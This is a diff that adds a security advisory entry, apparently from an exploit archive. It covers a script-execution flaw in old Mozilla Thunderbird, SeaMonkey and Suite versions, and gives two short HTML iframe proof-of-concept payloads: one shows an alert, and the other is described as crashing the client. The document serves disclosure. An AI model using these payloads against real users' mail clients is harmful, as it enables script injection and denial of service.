@@ -1,0 +1,25 @@
+source: http://www.securityfocus.com/bid/16770/info
+
+Multiple Mozilla products are prone to a script-execution vulnerability. 
+
+The vulnerability presents itself when an attacker supplies a specially crafted email to a user containing malicious script code in an IFRAME and the user tries to reply to the mail. Arbitrary JavaScript can be executed even if the user has disabled JavaScript execution in the client. 
+
+The following mozilla products are vulnerable to this issue:
+- Mozilla Thunderbird, versions prior to 1.5.0.2, and prior to 1.0.8
+- Mozilla SeaMonkey, versions prior to 1.0.1
+- Mozilla Suite, versions prior to 1.7.13
+
+<html>
+<body>
+<iframe src="javascript:alert('Found by www.sysdream.com !')"></iframe>
+</body>
+</html>
+
+* Denial of service (application crash) :
+
+<html>
+<body>
+<iframe src="javascript:parent.document.write('Found by www.sysdream.com
+!')"></iframe>
+</body>
+</html>
